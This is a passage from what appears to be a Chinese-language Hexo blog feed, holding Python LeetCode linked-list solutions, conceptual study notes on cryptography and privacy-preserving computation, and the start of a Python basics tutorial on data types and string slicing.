class="keyword">if</span> head: <span class="comment">#最后再合并最后一个不为空的</span></span><br><span class="line">            List_res.next=head</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            List_res.next=tail</span><br><span class="line">        <span class="keyword">return</span> Dummy.next</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(self,head)</span>:</span> <span class="comment">#逆转链表</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span> <span class="keyword">or</span> head.next==<span class="literal">None</span>: <span class="keyword">return</span> head</span><br><span class="line">        pre=<span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> head!=<span class="literal">None</span>:</span><br><span class="line">            tmp=head.next</span><br><span class="line">            head.next=pre</span><br><span class="line">            pre=head</span><br><span class="line">            head=tmp</span><br><span class="line">        <span class="keyword">return</span> pre</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMidlle</span><span class="params">(self,head)</span>:</span> <span class="comment">#找中点</span></span><br><span class="line">        slow=head</span><br><span class="line">        fast=head.next</span><br><span class="line">        <span class="keyword">while</span> fast <span class="keyword">and</span> fast.next:</span><br><span class="line">            fast=fast.next.next</span><br><span class="line">            slow=slow.next</span><br><span class="line">        <span class="keyword">return</span> slow</span><br></pre></td></tr></table></figure>

<h1 id="环形链表-i"><a href="#环形链表-i" class="headerlink" title="环形链表-i"></a>环形链表-i</h1><p><a href="https://leetcode-cn.com/problems/linked-list-cycle/" target="_blank" rel="noopener">环形链表-i</a></p>
<p>给定一个链表，判断链表中是否有环。</p>
<p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p>
<p><strong>思路</strong></p>
<p>主要思路还是快慢指针，如果由</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasCycle</span><span class="params">(self, head: ListNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        slow=head</span><br><span class="line">        fast=head.next</span><br><span class="line">        <span class="keyword">while</span> fast <span class="keyword">and</span> fast.next:</span><br><span class="line">            <span class="keyword">if</span> fast==slow:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            fast=fast.next.next</span><br><span class="line">            slow=slow.next</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h1 id="❓-环形链表-ii"><a href="#❓-环形链表-ii" class="headerlink" title="❓ 环形链表-ii"></a>❓ 环形链表-ii</h1><p>找环的入口点：</p>
<ul>
<li>首先快慢指针找到中点</li>
<li>然后fast会到head节点，slow移动到中点，二者同步向前移动，<strong>最终相遇时即是环的入口点？</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detectCycle</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span>: <span class="keyword">return</span> head</span><br><span class="line">        fast=head.next</span><br><span class="line">        slow=head</span><br><span class="line">        <span class="keyword">while</span> fast <span class="keyword">and</span> fast.next:</span><br><span class="line">            <span class="keyword">if</span> fast==slow:</span><br><span class="line">                fast=head</span><br><span class="line">                slow=slow.next</span><br><span class="line">                <span class="keyword">while</span> fast!=slow:</span><br><span class="line">                    fast=fast.next</span><br><span class="line">                    slow=slow.next</span><br><span class="line">                <span class="keyword">return</span> slow</span><br><span class="line">            fast=fast.next.next</span><br><span class="line">            slow=slow.next</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<h1 id="深拷贝链表"><a href="#深拷贝链表" class="headerlink" title="深拷贝链表"></a>深拷贝链表</h1><ul>
<li>哈希表深拷贝</li>
<li>有丝分裂法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, x: int, next: 'Node' = None, random: 'Node' = None):</span></span><br><span class="line"><span class="string">        self.val = int(x)</span></span><br><span class="line"><span class="string">        self.next = next</span></span><br><span class="line"><span class="string">        self.random = random</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#DFS哈希表深拷贝</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">copyRandomList</span><span class="params">(self, head: <span class="string">'Node'</span>)</span> -&gt; 'Node':</span></span><br><span class="line">        lookup = &#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(head)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> head: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> head <span class="keyword">in</span> lookup: <span class="keyword">return</span> lookup[head]</span><br><span class="line">            clone = Node(head.val, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">            lookup[head] = clone </span><br><span class="line">            clone.next, clone.random = dfs(head.next), dfs(head.random)</span><br><span class="line">            <span class="keyword">return</span> clone</span><br><span class="line">        <span class="keyword">return</span> dfs(head)</span><br><span class="line"></span><br><span class="line"><span class="comment">#哈希表深拷贝</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">copyRandomList</span><span class="params">(self, head: <span class="string">'Node'</span>)</span> -&gt; 'Node':</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        visited=dict()</span><br><span class="line">        cur=head</span><br><span class="line">        <span class="keyword">while</span> cur: <span class="comment">#首先只考虑把所有的节点的值都hash存起来</span></span><br><span class="line">            visited[cur]=Node(cur.val,<span class="literal">None</span>,<span class="literal">None</span>)</span><br><span class="line">            cur=cur.next</span><br><span class="line">        cur=head</span><br><span class="line">        <span class="keyword">while</span> cur:</span><br><span class="line">            visited[cur].next=visited.get(cur.next)</span><br><span class="line">            visited[cur].random=visited.get(cur.random)</span><br><span class="line">            cur=cur.next</span><br><span class="line">        <span class="keyword">return</span> visited[head]</span><br><span class="line"><span class="comment">#有丝分裂法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">copyRandomList</span><span class="params">(self, head: <span class="string">'Node'</span>)</span> -&gt; 'Node':</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        current=head</span><br><span class="line">        <span class="keyword">while</span> current!=<span class="literal">None</span>: <span class="comment">#首先先有丝分裂</span></span><br><span class="line">            clone=Node(current.val,current.next)</span><br><span class="line">            temp=current.next</span><br><span class="line">            current.next=clone</span><br><span class="line">            current=temp</span><br><span class="line">        current=head</span><br><span class="line">        <span class="keyword">while</span> current!=<span class="literal">None</span>: <span class="comment">#然后复制random节点</span></span><br><span class="line">            <span class="keyword">if</span> current.random!=<span class="literal">None</span>:</span><br><span class="line">                current.next.random=current.random.next</span><br><span class="line">            current=current.next.next</span><br><span class="line">        current=head</span><br><span class="line">        cloneHead=current.next</span><br><span class="line">        <span class="keyword">while</span> current!=<span class="literal">None</span> <span class="keyword">and</span> current.next!=<span class="literal">None</span>: <span class="comment">#最后删除老节点</span></span><br><span class="line">            temp=current.next</span><br><span class="line">            current.next=current.next.next</span><br><span class="line">            current=temp</span><br><span class="line">        <span class="keyword">return</span> cloneHead <span class="comment">#返回</span></span><br><span class="line">        <span class="comment"># visited=dict()</span></span><br><span class="line">        <span class="comment"># Dummy=Node(0)</span></span><br><span class="line">        <span class="comment"># Dummy.next=Node()</span></span><br><span class="line">        <span class="comment"># while head:</span></span><br><span class="line">        <span class="comment">#     if head not in visited:</span></span><br><span class="line">        <span class="comment">#         head</span></span><br></pre></td></tr></table></figure>



<h1 id="两链表的公共节点"><a href="#两链表的公共节点" class="headerlink" title="两链表的公共节点"></a>两链表的公共节点</h1><p><a href="https://leetcode-cn.com/problems/liang-ge-lian-biao-de-di-yi-ge-gong-gong-jie-dian-lcof/" target="_blank" rel="noopener">剑指offer 52</a></p>
<p>主要是参透了</p>
<p>a+c+b=b+c+a</p>
<p>即三者相加距离相同，就可以找到答案</p>
<p>设交集链表长c,链表1除交集的长度为a，链表2除交集的长度为b，有</p>
<ul>
<li>a + c + b = b + c + a</li>
<li>若无交集，则a + b = b + a</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getIntersectionNode</span><span class="params">(self, headA: ListNode, headB: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        h1,h2=headA,headB</span><br><span class="line">        <span class="keyword">while</span> h1!=h2:</span><br><span class="line">            h1=headB <span class="keyword">if</span> h1==<span class="literal">None</span> <span class="keyword">else</span> h1.next</span><br><span class="line">            h2=headA <span class="keyword">if</span> h2==<span class="literal">None</span> <span class="keyword">else</span> h2.next</span><br><span class="line">        <span class="keyword">return</span> h1</span><br></pre></td></tr></table></figure>

<h1 id="两两交换链表中的节点"><a href="#两两交换链表中的节点" class="headerlink" title="两两交换链表中的节点"></a>两两交换链表中的节点</h1><p><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/submissions/" target="_blank" rel="noopener">两两交换链表中的节点</a></p>
<p>主要要用tmp把暂时无关的节点存好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">swapPairs</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head <span class="keyword">or</span> <span class="keyword">not</span> head.next: <span class="keyword">return</span> head</span><br><span class="line">        tmpnext=head.next.next</span><br><span class="line">        tmp=head.next</span><br><span class="line">        tmp.next=head</span><br><span class="line">        head.next=self.swapPairs(tmpnext)</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学复习</title>
    <url>/2020/07/30/2020-07-30-review-of-cryptography/</url>
    <content><![CDATA[<h1 id="📚密码学"><a href="#📚密码学" class="headerlink" title="📚密码学"></a>📚密码学</h1><h2 id="1-密钥交换方案"><a href="#1-密钥交换方案" class="headerlink" title="1.密钥交换方案"></a>1.密钥交换方案</h2><h3 id="PKI-Public-KeyInfrastructure-公钥基础设施"><a href="#PKI-Public-KeyInfrastructure-公钥基础设施" class="headerlink" title="PKI (Public KeyInfrastructure)公钥基础设施"></a>PKI (Public KeyInfrastructure)公钥基础设施</h3><p><a href="https://blog.csdn.net/xu2439645715/article/details/88734530" target="_blank" rel="noopener">PKI介绍</a></p>
<blockquote>
<p>PKI（Public Key Infrastructure ） 即”公钥基础设施”，是一种遵循既定标准的密钥管理平台,它能够为所有网络应用提供加密和数字签名等密码服务及所必需的密钥和证书管理体系(哈哈，加粗提取主谓宾)，简单来说，PKI就是利用公钥理论和技术建立的提供安全服务的基础设施。PKI技术是信息安全技术的核心，也是电子商务的关键和基础技术。</p>
</blockquote>
<p><strong>通俗来讲，PKI 是互联网安全信任的基础</strong></p>
<p>完整的 PKI 系统必须具有以下五个部分</p>
<p><strong>CA 认证机构</strong>：提供数字证书的申请签发、是第三方权威机构</p>
<p><strong>数字证书库：</strong>存放已发放的证书</p>
<p><strong>密钥备份及恢复系统：</strong>为证书申请方提供服务</p>
<p><strong>证书作废系统：</strong>过期证书作废</p>
<p><strong>应用接口（API）：</strong>提供基础的服务应用接口，如加密、数字签名等</p>
<ol>
<li>单纯的对称、非对称加密、以及他们的结合都不安全，因为无法在传输密钥时保证保密性、真实性、完整性</li>
<li>仅仅是加上摘要的数字签名，也可能会遭遇重放攻击、而且无法保证真实性，只能保证完整性、保密性</li>
<li>如果有了 CA 颁发的证书，就可以确保真实性</li>
</ol>
<h3 id="Diffi-Halman-非对称密钥交换"><a href="#Diffi-Halman-非对称密钥交换" class="headerlink" title="Diffi-Halman 非对称密钥交换"></a>Diffi-Halman 非对称密钥交换</h3><p><a href="https://zh.wikipedia.org/wiki/迪菲-赫爾曼密鑰交換" target="_blank" rel="noopener">DH交换</a></p>
<p>是一个密钥交换的方案，如下图可以容易知道整个过程。</p>
<p>最后的 K 即是两方交换得到的密钥。</p>
<p>而基于 <strong>离散对数问题</strong> ，攻击者是无法根据 A \ B \ g \ p 计算出 a \ b \ K 的。</p>
<p>所以这是一个安全的方案。</p>
<p><img src="/2020/07/30/2020-07-30-review-of-cryptography/image-20200723114719364.png" alt="image-20200723114719364"></p>
<h2 id="2-DES、AES"><a href="#2-DES、AES" class="headerlink" title="2.DES、AES"></a>2.DES、AES</h2><p><strong>DES结构</strong></p>
<p><img src="/2020/07/30/2020-07-30-review-of-cryptography/image-20200723115834624.png" alt="image-20200723115834624"></p>
<p><strong>AES结构</strong></p>
<p>我使用 java 原理复现的 AES 加解密文件程序</p>
<p><a href="https://github.com/ColaLinN/cryptology_project" target="_blank" rel="noopener">https://github.com/ColaLinN/cryptology_project</a></p>
<p><img src="https://pic3.zhimg.com/80/v2-38c0d8de4b7b0938709a3c96eef9c17d_720w.jpg" alt="img"></p>
<h2 id="3-非对称密码-RSA-Elgamal"><a href="#3-非对称密码-RSA-Elgamal" class="headerlink" title="3.非对称密码  RSA Elgamal"></a>3.非对称密码  RSA Elgamal</h2><p><strong>RSA——离散对数问题</strong></p>
<p><a href="[https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95](https://zh.wikipedia.org/wiki/RSA加密演算法)">RSA维基百科</a></p>
<p><img src="/2020/07/30/2020-07-30-review-of-cryptography/image-20200723121106838.png" alt="image-20200723121106838"></p>
<p><strong>Elgamal——椭圆曲线离散对数问题</strong></p>
<p><a href="[https://zh.wikipedia.org/wiki/ElGamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95](https://zh.wikipedia.org/wiki/ElGamal加密算法)">Elgamal维基百科</a></p>
<p><img src="/2020/07/30/2020-07-30-review-of-cryptography/image-20200723121842310.png" alt="image-20200723121842310"></p>
<h2 id="4-hash算法-MD5、SHA、HMAC"><a href="#4-hash算法-MD5、SHA、HMAC" class="headerlink" title="4.hash算法 MD5、SHA、HMAC"></a>4.hash算法 MD5、SHA、HMAC</h2><h3 id="几种实际应用"><a href="#几种实际应用" class="headerlink" title="几种实际应用"></a>几种实际应用</h3><h4 id="hash冲突解决"><a href="#hash冲突解决" class="headerlink" title="hash冲突解决"></a>hash冲突解决</h4><p><a href="https://www.cnblogs.com/higerMan/p/11907117.html" target="_blank" rel="noopener">https://www.cnblogs.com/higerMan/p/11907117.html</a></p>
<p>由于数据过多，会有数据产生相同的哈希值</p>
<ol>
<li>开放地址方法 ：线性探测、再平方探测、伪随机探测 （即尽力找到一个空的）</li>
<li>链式地址法：相同哈希值下用链表连接</li>
<li>建立公共溢出区：用多余的空间存放冲突的数据</li>
<li>再哈希法：再次进行哈希，有点同法一</li>
</ol>
<h4 id="hashtable"><a href="#hashtable" class="headerlink" title="hashtable"></a>hashtable</h4><p>即链式哈希表</p>
<h4 id="加盐"><a href="#加盐" class="headerlink" title="加盐"></a>加盐</h4><p>在给密码哈希前加入随机数，或者是用户名等<strong>“盐”</strong></p>
<p>即使得到密码的哈希，也碰撞不出密码加盐后的哈希</p>
<h2 id="6-隐私保护"><a href="#6-隐私保护" class="headerlink" title="6.隐私保护"></a>6.隐私保护</h2><h3 id="安全多方计算"><a href="#安全多方计算" class="headerlink" title="安全多方计算"></a>安全多方计算</h3><ul>
<li><a href="https://zhuanlan.zhihu.com/p/31635977" target="_blank" rel="noopener">安全多方计算 Secure Multi-party Computation 初探</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/31641175" target="_blank" rel="noopener">安全计算方法概览</a></li>
</ul>
<p>一句话：安全多方计算即多个用户在不泄露数据的情况下进行计算等操作</p>
<p>比较经典的问题：</p>
<p><strong>百万富翁问题</strong>：多个富翁想比较财产多少，但又出于某些考虑不能将财产总价值泄露出来，于是衍生出了安全多方计算问题。</p>
<p>安全多方计算目前有两大类：基于差分隐私的、不基于差分隐私的。</p>
<p>不基于差分隐私的主要有三类：混淆电路、同态加密、零知识证明</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/40760105" target="_blank" rel="noopener">差分隐私 Differential Privacy 介绍</a></li>
</ul>
<p>一句话：保护的是数据源中一点微小的改动导致的隐私泄露问题。</p>
<p><img src="https://www.zhihu.com/equation?tex=Pr%5C%7BA%28D%29+%3D+O%5C%7D+%E2%89%A4e%5E%5Cepsilon+%5Ccdot+Pr%5C%7BA%28D%E2%80%99%29+%3D+O%5C%7D+" alt="[公式]"></p>
<p><strong>作用于任何相近的数据集</strong>，得到一个特定输出 <img src="https://www.zhihu.com/equation?tex=O" alt="[公式]"> 的概率应差不多，那么我们就说这个算法能达到差分隐私的效果。也就是说，观察者通过观察输出结果很难察觉出数据集一点微小的变化，从而达到保护隐私的目的。</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/41172002" target="_blank" rel="noopener">混淆电路 Garbled Circuit 介绍</a></li>
</ul>
<p>一句话：一些人各自拥有其隐私数据，他们想把这些数据合起来算点什么，但又不想把数据交给别人，混淆电路解决的就是此类问题。（即百万富翁问题的解决）</p>
<p>把计算公式化为门电路图</p>
<p><img src="/2020/07/30/2020-07-30-review-of-cryptography/image-20200723173336210.png" alt="image-20200723173336210"></p>
<p>Alice和Bob想计算一个与门。该门两个输入线 <img src="https://www.zhihu.com/equation?tex=x" alt="[公式]"> 和 <img src="https://www.zhihu.com/equation?tex=y" alt="[公式]"> 和一个输出线 <img src="https://www.zhihu.com/equation?tex=z" alt="[公式]"> ，每条线有0和1两个可能的值。Alice首先给每条线指定两个随机的key，分别对应0和1。</p>
<p>然后，Alice用这些密钥加密真值表，并将该表打乱后发送给Bob。加密过程就是将真值表中每一行对应的 <img src="https://www.zhihu.com/equation?tex=x" alt="[公式]"> 和 <img src="https://www.zhihu.com/equation?tex=y+" alt="[公式]"> 的密钥加密 <img src="https://www.zhihu.com/equation?tex=z" alt="[公式]"> 的密钥。这一加密+打乱的过程，就是混淆电路（garbled circuit）的核心思想。</p>
<p><img src="/2020/07/30/2020-07-30-review-of-cryptography/image-20200723173929125.png" alt="image-20200723173929125"></p>
<p>Bob 收到之后，用 Alice 的输入 Ex，以及自己的输入 Ey 解密四个数据Kz ， 最终成功解密一个kz（密文），Bob将其发给Alice，Alice即可知道比较结果。</p>
<p><strong>混淆电路+不经意传输 GC+OT</strong></p>
<p>主要可以如下流程应用，OT是不经意传输，可以保障Bob在Alice不知道的情况下从Alice处得到想要的Ey </p>
<p><img src="https://img-blog.csdn.net/20180704155455576?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2p1emhlbnl1YW4=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/44999983" target="_blank" rel="noopener">密钥分享 Secret Sharing 介绍</a></li>
</ul>
<p>一句话：密钥分享（secret sharing）可以在数据不被泄露的情况下，将计算任务分布式计算。</p>
<p>不用混淆电路GC的原因是，一些常见的算术操作（如乘法、乘方等），电路也非常复杂，GC的效率不够高。</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/77478956" target="_blank" rel="noopener">同态加密 Homomorphic Encryption 介绍</a></li>
</ul>
<p>一句话：密文的运算可以同步到明文中。</p>
<p>全同态加密：加法、乘法均同态</p>
<p>半同态加密：加法、乘法只满足其一</p>
<p>其中，RSA满足乘法同态，Paillier加密方案满足加法同态。</p>
<p>如下为RSA的同态举例：</p>
<p><img src="https://www.zhihu.com/equation?tex=%5Bx%5D%E2%89%94x%5Ee" alt="[公式]"></p>
<p><img src="https://www.zhihu.com/equation?tex=%5Bx%5D%E2%8B%85%5By%5D%3D%28xy%29%5Ee" alt="[公式]"></p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/144847471" target="_blank" rel="noopener">零知识证明 Zero-Knowledge Proof 介绍</a></li>
</ul>
<p>一句话：A在不让B知道任何数据的情况下，向B证明某件事是可信的。</p>
<p><strong>中心化差分隐私、本地化差分隐私</strong></p>
<p><a href="https://blog.csdn.net/Ano_onA/article/details/100760362" target="_blank" rel="noopener">本地化差分隐私（Local Differential Privacy）浅析</a></p>
<h3 id="匿名化"><a href="#匿名化" class="headerlink" title="匿名化"></a>匿名化</h3><ul>
<li>K匿名化和I多样性：通过准标识符可以充分识别唯一一个个体，例如身份证号。K匿名化通过扰动和泛化的方法使得每一个准标识符都至少对应k个实例，这样就不能唯一识别，从而保护了用户的隐私。</li>
<li>差分隐私：通过添加噪声的方法，确保删除或者添加一个数据集中的记录并不会影响分析的结果;因此，即使攻击者得到了两个仅相差一条记录的数据集，通过分析两者产生的结果都是相同的，也无法推断出隐藏的那一条记录的信息。</li>
<li>分布式隐私保护：大型的数据集可以在被分割后发布。</li>
</ul>
<h3 id="身份脱敏、内容脱敏"><a href="#身份脱敏、内容脱敏" class="headerlink" title="身份脱敏、内容脱敏"></a><strong>身份脱敏、内容脱敏</strong></h3><p>身份证脱敏处理（业务开发中，有时候身份证需要隐藏一部分）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IdCardUtils</span> </span>&#123;</span><br><span class="line">    <span class="comment">//身份证前三后四脱敏</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">idEncrypt</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(id) || (id.length() &lt; <span class="number">11</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> id;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> id.replaceAll(<span class="string">"(?&lt;=\\w&#123;6&#125;)\\w(?=\\w&#123;4&#125;)"</span>, <span class="string">"*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="搭建一个安全多方计算的框架——实战、相关的工具"><a href="#搭建一个安全多方计算的框架——实战、相关的工具" class="headerlink" title="搭建一个安全多方计算的框架——实战、相关的工具"></a>搭建一个安全多方计算的框架——实战、相关的工具</h3><h2 id="8-黑盒-白盒-灰盒密码"><a href="#8-黑盒-白盒-灰盒密码" class="headerlink" title="8.黑盒 白盒 灰盒密码"></a>8.黑盒 白盒 灰盒密码</h2><p>一句话概述：密码的加密、解密过程是否可以被公开</p>
<p><a href="https://zhuanlan.zhihu.com/p/21273220" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/21273220</a></p>
<h2 id="9-商密认证"><a href="#9-商密认证" class="headerlink" title="9.商密认证"></a>9.商密认证</h2><h2 id="10-SGX"><a href="#10-SGX" class="headerlink" title="10.SGX"></a>10.SGX</h2>]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>复习</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-07-30-python-1</title>
    <url>/2020/07/30/2020-07-30-python-1/</url>
    <content><![CDATA[<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><p><a href="https://www.runoob.com/python3/python3-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a></p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>Python3 的六个标准数据类型中：</p>
<ul>
<li><strong>不可变数据（3 个）：</strong>Number（数字）、String（字符串）、Tuple（元组）；</li>
<li><strong>可变数据：均为序列（3 个）：</strong>List（列表）、Dictionary（字典）、Set（集合）。</li>
</ul>
<p>python 函数的参数传递：</p>
<ul>
<li><strong>不可变类型：</strong>类似 c++ 的值传递，如 整数、字符串、元组。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。</li>
<li><strong>可变类型：</strong>类似 c++ 的引用传递，如 列表，字典。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响</li>
</ul>
<h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a, b, c, d&#x3D; 10,10.0,True,3+4j</span><br><span class="line">print(type(a),type(b),type(c),type(d))</span><br><span class="line"># &lt;class &#39;int&#39;&gt; &lt;class &#39;float&#39;&gt; &lt;class &#39;bool&#39;&gt; &lt;class &#39;complex&#39;&gt;</span><br><span class="line"></span><br><span class="line">del(a,...)</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/zyqy/p/9240396.html" target="_blank" rel="noopener">python 字符串常用操作方法</a></p>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>Python 没有单独的字符类型，一个字符就是长度为1的字符串。</p>
<p>Python 字符串不能被改变。向一个索引位置赋值，比如word[0] = ‘m’会导致错误。</p>
<p>切片一个点是：左起点包含，终点不包含</p>
<p><strong>[  开始索引,  结束索引,  步长] ** 遵循</strong>左闭右开**原则</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">"1234567891"</span></span><br><span class="line">print(a[<span class="number">0</span>]) <span class="comment">#1</span></span><br><span class="line">print(a[<span class="number">2</span>:<span class="number">5</span>]) <span class="comment">#345</span></span><br><span class="line">print(a[<span class="number">0</span>:<span class="number">-3</span>]) <span class="comment">#1234567</span></span><br><span class="line">print(a[<span class="number">-5</span>:<span class="number">-1</span>]) <span class="comment">#6789</span></span><br><span class="line">print(a[<span class="number">-2</span>:]) <span class="comment">#91 :代表1</span></span><br><span class="line"></span><br><span class="line">字符串转列表： <span class="keyword">return</span> eval(str) </span><br><span class="line">字符串转数字： <span class="keyword">return</span> int(str) </span><br><span class="line">四则运算： <span class="keyword">return</span> eval(str)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/30/2020-07-30-python-1/image-20200725162752968.png" alt="image-20200725162752968"></p>
<p>字符串转元组，逆转，再变回来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">"baidu"</span></span><br><span class="line">inputWords = a.split(<span class="string">" "</span>) <span class="comment">#['baidu']&lt;---</span></span><br><span class="line">output = <span class="string">''</span>.join(inputWords)&lt;---</span><br><span class="line"></span><br><span class="line">inputWords2 = list(a)&lt;---</span><br><span class="line">inputWords2=inputWords2[<span class="number">-1</span>::<span class="number">-1</span>] <span class="comment">#['u', 'd', 'i', 'a', 'b']</span></span><br><span class="line">output2 = <span class="string">''</span>.join(inputWords2)</span><br><span class="line">print(inputWords)</span><br><span class="line">print(inputWords2)</span><br></pre></td></tr></table></figure>

<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>加号 <strong>+</strong> 是列表连接运算符，星号 ***** 是重复操作。</p>
<p>Python 列表截取可以接收第三个参数，参数作用是截取的步长</p>
